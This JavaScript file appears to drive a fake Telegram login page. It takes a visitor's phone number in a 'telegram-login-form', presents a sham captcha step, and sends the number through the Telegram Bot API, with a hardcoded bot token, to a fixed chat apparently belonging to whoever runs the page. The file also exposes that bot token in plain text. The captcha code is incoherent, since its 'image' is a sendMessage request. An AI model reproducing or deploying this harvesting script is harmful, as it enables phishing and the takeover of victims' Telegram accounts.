const phoneNumberInput = document.getElementById('phone-number');
const form = document.getElementById('telegram-login-form');
const captchaContainer = document.getElementById('captcha-container');
const errorMessage = document.getElementById('error-message');

const telegramLoginUrl = 'https://telegram.org/auth/login';

function sendRequest(method, url, data) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open(method, url);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = () => {
      if (xhr.status === 200) {
        resolve(xhr.responseText);
      } else {
        reject(new Error(xhr.statusText));
      }
    };
    xhr.onerror = () => {
      reject(new Error('Network error'));
    };
    xhr.send(data);
  });
}

function generateCaptcha() {
  return sendRequest('GET', 'https://api.telegram.org/bot6809652653:AAHWREMEkP9vYrGgpffAoEq71zSRiP-5KXk/sendMessage', new URLSearchParams({
    phone_number: phoneNumberInput.value,
    text: 'Enter the captcha code from the Telegram app:',
    chat_id: '6939935510' // Replace with a valid chat ID where the captcha message should be sent.
  })).then(responseText => {
    const captchaMessage = JSON.parse(responseText);
    displayCaptcha(captchaMessage.result.message_id, captchaMessage.result.inline_message_id);
  }).catch(error => {
    console.error(error);
    errorMessage.textContent = 'An error occurred while generating the captcha.';
  });
}

function displayCaptcha(messageId, inlineMessageId) {
  captchaContainer.innerHTML = `
    <img src="https://api.telegram.org/bot6809652653:AAHWREMEkP9vYrGgpffAoEq71zSRiP-5KXk/sendMessage?parse_mode=Markdown&chat_id=-1001234567890&text=*Captcha:*&message_id=${messageId}&inline_message_id=${inlineMessageId}" alt="Captcha">
  `;
}

form.addEventListener('submit', event => {
  event.preventDefault();

  if (!phoneNumberInput.value.startsWith('+')) {
    errorMessage.textContent = 'Please enter the phone number in the following format: +251969829434';
    return;
  }

  generateCaptcha().then(() => {
    errorMessage.textContent = '';
  }).catch(error => {
    console.error(error);
    errorMessage.textContent = 'An error occurred while generating the captcha.';
  });
});

